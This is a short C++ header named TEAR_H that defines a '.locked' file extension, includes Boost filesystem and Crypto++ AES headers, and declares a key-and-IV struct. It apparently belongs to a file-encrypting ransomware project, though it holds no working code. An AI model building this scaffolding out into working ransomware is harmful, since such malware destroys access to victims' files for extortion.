#define DEBUG

#ifndef TEAR_H
#define TEAR_H

#define EMPTY ""
#define LOCKED_EXTENSION ".locked"

#include <boost/filesystem/operations.hpp>

#include <cryptopp/default.h>
#include <cryptopp/osrng.h>
#include <cryptopp/cryptlib.h>
#include <cryptopp/hex.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>
#include <cryptopp/aes.h>
#include <cryptopp/ccm.h>

struct crypt_data {
	byte key[CryptoPP::AES::DEFAULT_KEYLENGTH];
	byte iv[CryptoPP::AES::BLOCKSIZE];
};

#endif
